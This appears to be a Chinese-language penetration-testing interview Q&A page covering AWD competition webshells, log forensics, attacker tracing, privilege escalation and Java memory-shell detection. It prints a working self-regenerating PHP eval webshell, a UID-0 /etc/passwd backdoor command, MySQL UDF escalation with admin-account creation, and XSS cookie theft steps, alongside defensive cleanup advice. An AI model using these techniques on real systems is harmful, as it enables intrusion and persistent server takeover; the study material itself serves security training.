<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&#x27;.ZYGS.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_GET[&quot;zygs&quot;])==&quot;e10adc3949ba59abbe56e057f20f883e&quot;)&#123;@eval($_POST[&quot;ZYGS&quot;]);&#125;?&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">        <span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>解析</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);   <span class="comment">//设置与远程客户端断开后是否继续执行脚本，true即不断开</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);   <span class="comment">//设置脚本最大的执行时间，0即没有时间限制</span></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);   <span class="comment">//删除文件本身</span></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;.ZYGS.php&#x27;</span>;   <span class="comment">//文件名是.ZYGS.php</span></span><br><span class="line"><span class="variable">$code</span> = <span class="meta">&lt;?php</span> <span class="meta">?&gt;</span>;   <span class="comment">//php代码</span></span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(file,code);   <span class="comment">//打开file文件，然后写入code</span></span><br><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);   <span class="comment">//每隔usleep(5000)写入一个新文件</span></span><br></pre></td></tr></table></figure>
<p><code>unlink</code>就是为了删除传入的不死马文件,避免一些不必要的信息泄露出去,$file中可以规定你要不断生成的文件名,</p>
<p>usleep(time)是生成木马的时间;这也是不死马的灵魂之一,通过不断生成文件在当前目录下,形成了不死马,不死马是一个进程所以往往要重启主机或重启服务才能kill掉,当然也可以条件竞争</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&quot;zygs&quot;</span>])==<span class="string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span>)&#123;@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;ZYGS&quot;</span>]);&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这段代码是为了防止骑马(<strong>在以往的一句话木马中，密码简单方便呈现给了用户，如果在AWD中，知道了密码的话，就可以反手打一波其他的主机，因为如果是被批量种马的话，所有人都一样，这也就是&quot;骑马&quot;</strong>)，通过判断用户传入的变量，然后转换成md5值和e10adc3949ba59abbe56e057f20f883e进行对比，如果e10adc3949ba59abbe56e057f20f883e解密出来的值和用户传入的值是一样的话，就继续执行@eval($_POST[‘ZYGS’]),这也是整个不死马中的灵魂，就是为了防止乌鸦坐飞机，一个人拿分</p>
<p>(e10adc3949ba59abbe56e057f20f883e == 123456)</p>
<p>触发后,虽然web页面没有,但是在后台可以看到</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/ae3731bf20d64b4784488dc918688854.png" alt="在这里插入图片描述"></p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/c8211ed70d2e405eb775156b428d470c.png" alt="在这里插入图片描述"></p>
<h3 id="root用户角度的查杀">root用户角度的查杀</h3>
<h4 id="杀掉进程">杀掉进程</h4>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep www-data | awk ‘&#123;<span class="built_in">print</span> <span class="variable">$2</span>&#125;’ | xargs <span class="built_in">kill</span> -9</span><br><span class="line">然后重启服务</span><br></pre></td></tr></table></figure>
<h4 id="其他用户的查杀">其他用户的查杀</h4>
<p>在awd中，ctf用户没有权限，不能重启服务，而且，以ctf的用户来杀进程和条件竞争也是不可行的。（不死马会先创建，然后被删除，在创建到被删除的过程中会可利用。）</p>
<p>最简单的方式就是以www-data用户的角度通过杀进程来实现查杀。</p>
<h5 id="杀掉进程：">杀掉进程：</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @system(&quot;ps -aux | grep www-data | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
<h5 id="条件竞争">条件竞争:</h5>
<p>不推荐，如果不死马中没有调用usleep()函数，进行延时的话，条件竞争是gg的。</p>
<h2 id="75-排查出来一句话木马-没有日志怎么找">75.排查出来一句话木马,没有日志怎么找</h2>
<h3 id="检查网站目录">检查网站目录</h3>
<p>看是否有可疑的代码或者文件名。</p>
<h3 id="检查网络流量">检查网络流量</h3>
<p>使用网络监控工具分析网络流量，以检测与已知恶意主机或IP地址之间的通信。这可能会暴露任何存在的后门或远程控制连接。</p>
<h2 id="别人已经将木马传到主机时-怎么排查">别人已经将木马传到主机时,怎么排查</h2>
<p>同系统排查,进程,启动项,服务,网络连接端口检查,任务计划排查,用户信息检查</p>
<p>使用 lsof 命令查看当前是否有进程打开 / var/log/日志文件.log</p>
<p><code>lsof|grep/var/log/secure</code></p>
<p>rsyslogd1264root4wREG 8,13173904263917/var/log/secure(deleted)</p>
<p>从上面的信息可以看到 PID 1264（rsyslogd）打开文件的文件描述符为 4。同时还可以看到 / var/log/ secure 已经标记为被删除了。因此我们可以在 / proc/1264/fd/4（fd 下的每个以数字命名的文件表示进程对应的文件描述符）中查看相应的信息，如下：</p>
<p>查看/proc/1264/fd/4就能得到被删除的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@hlmcen69n3~]#tail/proc/1264/fd/4</span><br></pre></td></tr></table></figure>
<p><strong>防护</strong></p>
<h3 id="利用PHP的-功能">利用PHP的 功能</h3>
<ul>
<li>
<p>利用PHP的 disable_functions 功能,禁用一些常用的执行命令的函数，如 eval , assert , system , exec 等。</p>
</li>
<li>
<p>利用PHP的 safe_mode 功能，开启安全模式，限制PHP脚本的权限和功能。</p>
</li>
<li>
<p>利用WAF或者IDS等安全设备或软件，对一句话木马的特征进行检测和拦截。</p>
</li>
<li>
<p>利用文件监控或者日志分析等手段，及时发现和处理异常的文件或者请求。</p>
</li>
</ul>
<h2 id="76域内横向移动">76域内横向移动</h2>
<p>划重点:参考文章</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pingmaoer.github.io/2020/06/27/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%80/</span><br></pre></td></tr></table></figure>
<p>利用域内横向移动技术,以被攻陷的系统为跳板,访问其他域内主机,扩大资产范围(包括跳板机器中的文档和存储的凭证，以及通过跳板机器连接的数据库、域控制器或其他重要资产)</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/1.png" alt="1"></p>
<p>通过此类攻击手法,最终可能获取域控制器的访问权限,甚至完全控制基于Windows操作系统的基础设置和与业务相关的关键账户</p>
<h3 id="0x01-常用的windows远程连接和相关命令">0x01 常用的windows远程连接和相关命令</h3>
<h4 id="0x02-Windoors系统散列值获取">0x02 Windoors系统散列值获取</h4>
<h4 id="0x03-哈希传递攻击">0x03 哈希传递攻击</h4>
<h4 id="0x04票据传递">0x04票据传递</h4>
<h2 id="77-如何溯源">77.如何溯源</h2>
<h3 id="答案一">答案一:</h3>
<p><code>判断Webshell事件发生时间</code>：根据异常现象发生时间，结合网站目录中Webshell文件的创建时间，可大致定位事件发生的时间段。以便后续依据此时间进行溯源分析、追踪攻击者的活动路径。</p>
<p><code>对攻击路径进行溯源分析</code>：如果网站被植入暗链或出现单击链接跳转到其他网站(如博彩网站、色情网站等)的情况，应首先排查网站首页相关js，查看是否被植入了恶意跳转的js。<br>
若网站首页被篡改或有其他被攻击的现象，可以根据网站程序信息，如程序目录、文件上传目录、war包部署目录，使用工具(如D盾)和搜索关键词(如eval、 base64_ decode、assert)方式，定位到Webshell文件并清除。然后根据日志进行溯源分析，同时除了进行Web应用层排查，还应对系统层进行全面排查，防止攻击者在获取Webshel后执行了其他的权限维持操作。</p>
<p><code>判断系统架构</code>：收集系统信息，为快速溯源分析提供前期准备工作</p>
<table>
<thead>
<tr>
<th>项目</th>
<th>内容</th>
</tr>
</thead>
<tbody>
<tr>
<td>服务器</td>
<td>Windows、Linux等</td>
</tr>
<tr>
<td>内容管理系统(CMS)</td>
<td>Jeecms、Wordpress、 Drupal、 TRS WCM、Phpcms、 Dedecms 等</td>
</tr>
<tr>
<td>中间件</td>
<td>Tomcat、IIS、 Apache、 WebLogic、 JBoss、 Websphere、 Jetty 等</td>
</tr>
<tr>
<td>框架</td>
<td>Struts2、Thinkphp、 Spring、 Shiro、 Fastjson 等</td>
</tr>
<tr>
<td>数据库</td>
<td>Tomcat、IIS、 Apache、 WebLogic、 Struts、 MySQL等</td>
</tr>
<tr>
<td>脚本语言</td>
<td>ASP、PHP、JSP 等</td>
</tr>
<tr>
<td>业务架构</td>
<td>如前端网页内容是否是后端通过FTP上传的(新闻网偏多)等</td>
</tr>
</tbody>
</table>
<h3 id="答案二">答案二</h3>
<h4 id="针对-ip-溯源一二">针对 ip 溯源一二</h4>
<p>一般来说，红队大部分都是使用代理节点进行测试，假如我们捕获或者从样本里面分析拿到了真实的 ip, 那么以下的操作场景就有用了，或者使用钓鱼反调的方式去获取到真实的 ip</p>
<h4 id="来自创宇盾等节点的流量-ip">来自创宇盾等节点的流量 ip</h4>
<p>ip, 假设前面还有一层云 waf cdn 厂商等。那么需要协调到提供服务的厂商，快速获取到云 waf 或者 cdn 之前的节点真实 ip. 然后拿到了真实的 ip, 就变成了一些常规的溯源操作</p>
<h4 id="whois-域名反查">whois 域名反查</h4>
<p>ip, 初步可以进行 whois 查询，以及域名反查，查看历史的解析，以及历史的 ip 用有记录，运气好的话，假如攻击队队员使用的是自己的博客之类的 vps 常用节点，那么很有可能通过这个手法进行溯源到相关人员</p>
<h4 id="探测端口-服务-进行反渗透">探测端口 服务 进行反渗透</h4>
<p>ip, 对该 ip 进行端口探测，服务探测，进行反渗透，一般来说红队的 vps 都是在一些国内的一些 vps 主机供应商或者云服务供应商那边购买，假如是国内的话，可以通过公安网警来进行协助查水表，获取真实人员的身份。假如我们反渗透成功，那么可以提取历史登入记录，历史 ip, 网络连接，进程 以及攻击工具 进程 内存镜像等方式进行取证分析.</p>
<h4 id="威胁情报">威胁情报</h4>
<p>ip, 对使用威胁情报进行综合分析，查看该 ip 他人对该 ip 打的标签，历史解析记录，历史变更记录，以及该 ip 上面关联的相关样本，这些都能够获取到进行进一步分析.</p>
<h4 id="邮箱-qq-手机号-社工库">邮箱 qq 手机号 社工库</h4>
<p>通过 ip 的 whois 获取到了相关人员的 qq 或者邮箱或者手机号，那么可以使用社工库，进行社工查询。比如 twitter 的社工库机器人或者自行研究的社工库进行综合关联分析</p>
<h4 id="qq-微信-抖音-陌陌-等接口">qq 微信 抖音 陌陌 等接口</h4>
<p>获取到了手机号，那么可以通过 qq 微信 抖音 陌陌 等接口进行关联，一般获取到了手机号初步可以通过这种简单易行的手法去溯源到红队人员</p>
<h4 id="ga-数据-运营商数据">ga 数据 运营商数据</h4>
<p>有办法能通过 ga 资源，或者直接通过运营商拿数据，那就更好了</p>
<h3 id="溯源如果挂了代理怎么做？"><strong>溯源如果挂了代理怎么做？</strong></h3>
<p>① 首先我要去查看报警日志,看一下是IP还是域名</p>
<p>情况1:如果是域名可以挂CDN,国外CloudFlare</p>
<p>情况1:如果没有CDN,用多地ping或者dns查询获取真实IP</p>
<p>情况2:如果有CDN,用各种方法</p>
<p>情况2:如果是IP,就需要查看数据包类型,有可能是http,tcp,…</p>
<p>情况1:如果是http,我可以去查看一下数据包的请求,有一些字段会暴露代理IP</p>
<p>REMOTE_ADDR 如果使用了代理就是代理IP,没有使用就是自己的IP</p>
<p>除此之外还有其他的一些字段,HTTP_X_FORWARDED_FOR</p>
<p>情况2:如果是socks,比如sock4或sock5,有一种情况是sock协议不会使用udp协议</p>
<p>我可以给IP发UDP数据包,查看返回信息,如果没有正确响应就说是代理</p>
<h2 id="78-网络空间搜索引擎用过吗">78.网络空间搜索引擎用过吗</h2>
<h3 id="FOFA">FOFA</h3>
<p>官网：<a target="_blank" rel="noopener" href="https://fofa.info/">https://fofa.info/</a></p>
<p>FOFA是白帽汇推出的一款网络空间搜索引擎，它通过进行网络空间测绘，能够帮助研究人员或者企业迅速进行网络资产匹配，例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等.</p>
<table>
<thead>
<tr>
<th>逻辑连接符</th>
<th>具体含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>=</td>
<td>匹配，=&quot;&quot;时，可查询不存在字段或者值为空的情况。</td>
</tr>
<tr>
<td>==</td>
<td>完全匹配，==&quot;&quot;时，可查询存在且值为空的情况。</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>与</td>
</tr>
<tr>
<td>||</td>
<td>或者</td>
</tr>
<tr>
<td>!=</td>
<td>不匹配，!=&quot;&quot;时，可查询值为空的情况。</td>
</tr>
<tr>
<td>*=</td>
<td>模糊匹配，使用<em>或者?进行搜索，比如banner</em>=“mys??” (个人版及以上可用)。</td>
</tr>
<tr>
<td>()</td>
<td>确认查询优先级，括号内容优先级最高。</td>
</tr>
</tbody>
</table>
<h2 id="79-怎么用渗透工具配合xss攻击获取服务器权限">79.怎么用渗透工具配合xss攻击获取服务器权限</h2>
<p>想要获取服务器权限的话,可以搭建XSS平台,配合XSS获取到管理员的Cookie</p>
<p>访问之后通过chrome上的EditThisCookie插件替换cookie成功以管理员的身份进入后台</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">利用[浏览器的同源策略](https://www.jianshu.com/p/8aa9474a148c)</span><br><span class="line"></span><br><span class="line">同源的定义：如果两个页面的协议，端口和主机都相同，则两个页面具有相同的源。Cookie：只有同源的网页才能共享，但是若两个页面一级域名相同，只是二级域名不同，那么浏览器可以通过设置document.domain来共享Cookie。</span><br><span class="line"></span><br><span class="line">通过同源策略，我们成功的进入了管理员的后台。</span><br></pre></td></tr></table></figure>
<p>进入后台第一件事：找上传点！</p>
<p>看看自己是什么权限</p>
<p>试一下能不能弹shell到msf</p>
<h3 id="挖矿">挖矿</h3>
<p>隔离主机、排查（top资源占用、开机启动、任务计划、端口开放）、清除</p>
<h3 id="内网">内网</h3>
<p><strong>内网横移</strong>：IPC、WMI、SMB、msf密码喷射、PTP（ms14-068）</p>
<p><strong>内网报警</strong>：定位报警&gt;打补丁&gt;木马查杀&gt;分析流量&gt;微补查询&gt; whois&gt;社工</p>
<h3 id="JNDI注入">JNDI注入</h3>
<p><strong>原理:</strong></p>
<p>当应用进行JNDI查询的时候，若查询的URL可以由攻击者控制，则攻击者可以使服务器去查询恶意的链接使得服务器加载一些恶意Class，实现任意代码执行。</p>
<p><strong>防护建议</strong></p>
<ul>
<li>若该漏洞源于第三方组件，请及时进行组件版本升级。</li>
<li>若为自写JNDI查询代码，请对查询的URL进行限制，禁止一些危险协议的查询。</li>
</ul>
<h3 id="JNI注入">JNI注入</h3>
<p><strong>原理:</strong></p>
<p>JNI注入是一种通用的RASP（Runtime Application Self-Protection）绕过手段。当攻击者拿到代码执行权限后，可以通过Java Native函数去调用外部的恶意动态链接库，从而绕过Java层的安全防护，并隐匿具体的恶意行为。</p>
<p><strong>防护建议:</strong></p>
<p>服务器可能存在代码执行漏洞，检查漏洞的位置并限制执行代码的功能。</p>
<h3 id="JSTL任意文件包含">JSTL任意文件包含</h3>
<p><strong>原理:</strong></p>
<p>JSP标准标签库（JSTL）是一个JSP标签集合，它封装了JSP应用的通用核心功能。当用户可控参数被直接拼接到JSTL标签中而未对该参数进行任何限制的情况下，攻击者可以构造特殊的攻击脚本造成任意文件读取、SSRF的攻击。</p>
<p><strong>防护建议:</strong></p>
<p>尽可能不要将用户可控参数直接拼接到JSTL标签上，如果必须这样做，请对该参数的内容进行严格的白名单控制。</p>
<h2 id="80-获得了etc-passwd文件之后如何利用">80.获得了etc/passwd文件之后如何利用</h2>
<p><strong>暴力破解密码</strong></p>
<p>当我们可以写入etc/passwd文件,利用 /etc/passwd 文件的可写入权限，导致我们写入一个其他用户进去。</p>
<p>我们现在要做的就是自己构造一个用户，在密码占位符处指定密码，并且UID设置为0，将其添加到 /etc/passwd 文件中。</p>
<p>首先，使用perl语言生成带有盐值的密码：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -le <span class="string">&#x27;print crypt(&quot;password@123&quot;,&quot;addedsalt&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/20190820185556404.png" alt="img"></p>
<p>然后执行下面这条命令，成功将test用户的信息加入 /etc/passwd 文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;test:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash&quot;</span> &gt;&gt;/etc/passwd</span><br></pre></td></tr></table></figure>
<p>以用户名：test 密码： password@123 登录主机，登录成功后，是 root 权限。</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/20190820205147934.png" alt="img"></p>
<h2 id="-3"></h2>
<h2 id="81-java内存马查杀">81.java内存马查杀</h2>
<p><strong>内存马特点就是无文件落地webshell中</strong>，随着攻防演练对抗强度越来越高，流量分析、EDR等专业安全设备被蓝方广泛使用，传统的文件上传的webshll以及文件形式的后门容易被检测到，文件shell明显气数已尽，而内存马因其隐蔽性等优点从而越来越盛行。</p>
<p>由客户端发起的Web请求后，中间件的各个独立的组件如Listener、Filter、Servlet等组件会在请求过程中做监听、判断、过滤等操作，内存马就是利用请求过程在内存中修改已有的组件或动态注册一个新的组件，插入恶意的shellcode，达到持久化控制服务器的目的。内存马可以通过访问存在漏洞的url加上命令执行参数，即可让服务器返回结果也可通过webshell管理工具例如：蚁剑、冰蝎、哥斯拉等进行远程连接后攻击目标。</p>
<p>内存马在语言类型上有PHP内存马，Python内存马，而本文主要侧重于“市场占有率”最高的java内存马的检测与查杀，java内存马又主要分为下面这</p>
<h3 id="内存马特征的识别">内存马特征的识别</h3>
<h3 id="三大类">三大类</h3>
<ul>
<li>servlet-api类
<ul>
<li>filter型</li>
<li>servlet型</li>
<li>listener型</li>
</ul>
</li>
<li>spring类
<ul>
<li>拦截器</li>
<li>controller型</li>
</ul>
</li>
<li>Java Instrumentation类
<ul>
<li>agent型</li>
</ul>
</li>
</ul>
<p>依然是以filter内存马举例</p>
<h4 id="利用java-agent技术遍历所有已经加载到内存中的class-先判断是否是内存马-是则进入内存查杀">利用java agent技术遍历所有已经加载到内存中的class,先判断是否是内存马,是则进入内存查杀</h4>
<h4 id="filter特殊名称">filter特殊名称</h4>
<p>内存马的Filter名一般比较特别，随便一点的可能有shell，Mem这种关键词或者随机数随机字母。当然这个特征并不是决定条件，因为讲究一点的攻击者也可以将filter伪装成web应用自带的名称。</p>
<h4 id="filter优先级是第一位">filter优先级是第一位</h4>
<p>为了确保内存马在各种环境下都可以访问，往往需要把filter匹配优先级调至最高，比如shiro反序列化漏洞。</p>
<h4 id="web-xml中没有filter配置">web.xml中没有filter配置</h4>
<p>内存马的Filter是动态注册的，所以在web.xml中肯定没有配置，如果发现了在web.xml中不存在的filter，那么这个filter就十分可疑了</p>
<h4 id="特殊classloader加载">特殊classloader加载</h4>
<p>一般来说，正常的Filter都是由中间件的WebappClassLoader加载的。而攻击者利用的getshell攻击链往往具有明显的特征，比如反序列化漏洞喜欢利用TemplatesImpl和bcel执行任意代码。所以这些class往往就是以下这两个：</p>
<p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$Translet<strong>ClassLoader</strong></p>
<p>com.sun.org.apache.bcel.internal.util.ClassLoader</p>
<p><strong>对应的classloader路径下没有class文件</strong><br>
<strong>所谓内存马就是代码驻留内存中，本地无对应的class文件。所以我们只要检测Filter对应的ClassLoader目录下是否存在class文件</strong>。(这也是很多内存马检测脚步实现的原理)</p>
<h4 id="Filter的doFilter方法中有恶意代码">Filter的doFilter方法中有恶意代码</h4>
<p>我们可以把内存中所有的Filter的class dump出来，使用反编译工具分析看看，是否存在恶意代码，比如调用了：java.lang.Runtime.getRuntime，defineClass，invoke</p>
<h3 id="原理简述">原理简述</h3>
<h4 id="servlet-api类">servlet-api类</h4>
<p>以filter内存马为例</p>
<p>Tomcat Filter工作流程：</p>
<p>这类内存马会先创建了一个恶意的servlet，然后获取当前的StandardContext，将恶意servlet封装成wrapper添加到StandardContext的children当中，最后添加ServletMapping将访问的URL和wrapper进行绑定。执行上述代码后，访问当前应用的特定url路径，加上特定的参数就可以命令执行了。</p>
<h2 id="82-对边缘业务小程序渗透过吗">82.对边缘业务小程序渗透过吗</h2>
<p>渗透过,利用proxy将微信小程序代理转发到BP接口端口,</p>
<p>主要是通过爆破api接口,查看是不是有一些能利用的端口,比如之前SRC遇到过一个,</p>
<p>类似于getalluser的接口,只需要post发送id的值[1,n]</p>
<p>就会回显这些用户id的信息</p>
<p>这些接口相比于web更容易有SQL注入,</p>
<h2 id="83-对镜像劫持的了解">83.对镜像劫持的了解</h2>
<p>“映像文件执行参数”</p>
<p>表现为常见的杀毒软件、防火墙、安全检测工具等均提示“找不到文件”或执行了没有反应</p>
<p>改名可以正常使用</p>
<h2 id="84-mysql-的udf提权：原理">84.<strong>mysql 的udf提权：原理</strong></h2>
<p><strong>UDF (user defined function)</strong>，即用户自定义函数。是通过添加新函数，对MySQL的功能进行扩充，其实就像使用本地MySQL函数如 user() 或 concat() 等。</p>
<p>在 udf.dll 文件中，我定义了名为 sys_eval() 的 MySQL 函数，该函数可以执行系统任意命令</p>
<p>select * from mysql.func where name = ‘sys_eval’; #查看创建的sys_eval函数<br>
select sys_eval(‘whoami’); #使用系统命令</p>
<p>SQL</p>
<p>当 MySQL&lt; 5.1 版本时，将 .dll 文件导入到 c:\windows 或者 c:\windows\system32 目录下。<br>
当 MySQL&gt; 5.1 版本时，将 .dll 文件导入到 MySQL Server 5.xx\lib\plugin 目录下 (lib\plugin目录默认不存在，需自行创建)。</p>
<p>在将 udf.dll 文件写入plugin目录后，我们就可以使用 sys_eval 函数了</p>
<p>两种方式进行 UDF的提权：</p>
<p>(一).通过大马的MySQL提权功能，成功导出 udf.dll 文件后，我们就可以直接在命令框输入 cmd 命令，来执行提权操作。注：在此之前，我们应执行版本查看语句，来确认当前MySQL的版本信息！</p>
<p>net user secist username /add</p>
<p>net localgroup administrators username /add</p>
<p>(二).直接在目标服务器上传 udf.php 此类的提权脚本提权。</p>
<p><strong>4、UDF提权的利用条件</strong></p>
<p>（1）MySQL数据库没有开启安全模式。</p>
<p>（2）已知的数据库账号具有对MySQL数据库insert和delete的权限，最好是root最高权限。</p>
<p>（3）shell有写入到数据库安装目录的权限。</p>
<p>（4）知道绝对路径</p>
<h2 id="85-JAVA-实现RCE漏洞的函数">85.<strong>JAVA 实现RCE漏洞的函数</strong></h2>
<p>Runtime.getruntieme.exec(“cmd”)</p>
<p>new ProcessBuilder().start(“cmd”)</p>
<h2 id="86-网络设备有使用过吗-防火墙-路由器-交换机">86.<strong>网络设备有使用过吗,防火墙,路由器,交换机</strong></h2>
<p>用过在学校部门里就是负责网络维护,</p>
<p>交换机负责连接网络设备（如交换机、路由器、防火墙、无线AP等）和终端设备（如计算机、服务器、摄像头、网络打印机等）；路由器实现局域网与局域网的互联，局域网与Internet的互联；而防火墙作为一个安全网络设备，作用于内部网络与内部网络之间，或者内部网络与Internet之间。总结，<strong>交换机负责连接设备，路由器负责连接网络，防火墙负责网络访问限制。</strong></p>
<p>路由器改桥接</p>
<p>用超级密码进入光猫设置，把原来的路由改为桥接模式，同时关闭DHCP功能</p>
<h2 id="87-最新的漏洞有了解过吗">87.<strong>最新的漏洞有了解过吗?</strong></h2>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU1Mjk3MDY1OA==&amp;mid=2247512913&amp;idx=1&amp;sn=5b24d2afd5d6f2bdb04ca68faf6a76ee">https://mp.weixin.qq.com/s?__biz=MzU1Mjk3MDY1OA==&amp;mid=2247512913&amp;idx=1&amp;sn=5b24d2afd5d6f2bdb04ca68faf6a76ee</a></p>
<p>Telegram上的一个漏洞</p>
<p>官方源文件中写错文件后缀名，pyzw写成了pywz，攻击者制作恶意的.pyzw文件可以在windows中执行任意代码。</p>
<p>pyzw 本质上就是一个zip文件，内附一个__main__.py 打包成zip，并修改为pyzw后缀名，运行文件就会去执行__main__.py里对应的Python代码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;subprocess&quot;).call([&quot;calc.exe&quot;])</span><br></pre></td></tr></table></figure>
<p>因为漏洞可以结合机器人进行转发，可以使文件变为mp4格式。</p>
<p><strong>漏洞利用限制条件</strong><br>
1、windows环境</p>
<p>2、安装有python</p>
<h2 id="88-看你有过开发的经验-有写过sql注入脚本-说一下这个脚本的情况">88.<strong>看你有过开发的经验,有写过sql注入脚本,说一下这个脚本的情况?</strong></h2>
<p>这个是用python写的一个自动化注入脚本，脚本利用了requests、time,base64等模块</p>
<p>时间盲注的函数：sleep、benchmark、笛卡尔积、GET-LOCK加锁、正则匹配</p>
<p>布尔盲注的函数：left、substr、length、mid、ascii、regexp正则</p>
<h2 id="89-mysql在linux的配置文件是哪个？">89.<strong>mysql在linux的配置文件是哪个？</strong></h2>
<p>my.cnf</p>
<p>1、Windows下MySQL的配置文件是my.ini，一般会在安装目录的根目录。</p>
<p>2、Linux下MySQL的配置文件是my.cnf，一般会放在/etc/my.cnf，/etc/mysql/my.cnf。如果找不到，可以用find命令查找。</p>
<p>3、Linux用rpm包安装的MySQL是不会安装/etc/my.cnf文件的</p>
<h2 id="90-如何判断使用的什么数据库？-判断web后台数据库类型的方法">90.**如何判断使用的什么数据库？**判断web后台数据库类型的方法</h2>
<p>谷歌插件 Wappalyzer</p>
<p><strong>一、根据网页编程语言去判断</strong></p>
<p><a target="_blank" rel="noopener" href="http://xn--ASP-cj4e.NET">ASP和.NET</a>：Microsoft SQL Server</p>
<p>PHP：MySQL、PostgreSQL</p>
<p>Java：Oracle、MySQL以上是常见的搭配。</p>
<p><strong>二、根据数据库报错判断</strong></p>
<p>输入单引号报错</p>
<p>mysql:error:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’’ at line 1</p>
<p>mssql：因为mssql是微软公司的，里面出现微软的英文名字Microsoft还有ODBC也是mssql特有的。</p>
<p>ORA的是ORACLE。</p>
<h2 id="91-Nginx的日志放在那里，如何进行分析-主要看哪些你认为重要的地方？">91.<strong>Nginx的日志放在那里，如何进行分析?主要看哪些你认为重要的地方？</strong></h2>
<p>默认的话是/var/log/nginx/,</p>
<p>在配置文件/etc/nginx/nginx.conf中也可以指定</p>
<p>配置文件/etc/nginx/nginx.conf</p>
<p>Nginx的日志分为访问日志access_log和错误日志error_log两大块，前者主要记录用户每次访问的情况，后者则侧重于服务器的具体错误，比如返回403的具体原因是文件不可读还是权限不足之类的。</p>
<p><strong>分析/var/log/nginx/access.log：</strong></p>
<p>1、可以根据每个所关心的字段读取频率最高的前十看看是否有什么出乎意料的情况，以客户端IP，客户端User-Agent，<br>
以及返回<strong>状态码</strong>为例。</p>
<p>2、流量观察:对于一般网站来说流量监控也是比较重要的，所以根据访问时间，可以统计出每天的访问量和一天中平均各个时间段的访问量：</p>
<p><strong>分析/var/log/nginx/error_log</strong>：</p>
<p>错误类型、路径错误、SEO（搜索引擎优化）、查错示例</p>
<h2 id="92-系统日志放在那里？">92.<strong>系统日志放在那里？</strong></h2>
<p>linux的var/log</p>
<p>windows的在Windows\System32\winevt\Logs</p>
<h2 id="93-遇到了IDS-IPS你如何对抗？">93.<strong>遇到了IDS/IPS你如何对抗？</strong></h2>
<p>回答了绕过，问：如何绕过：</p>
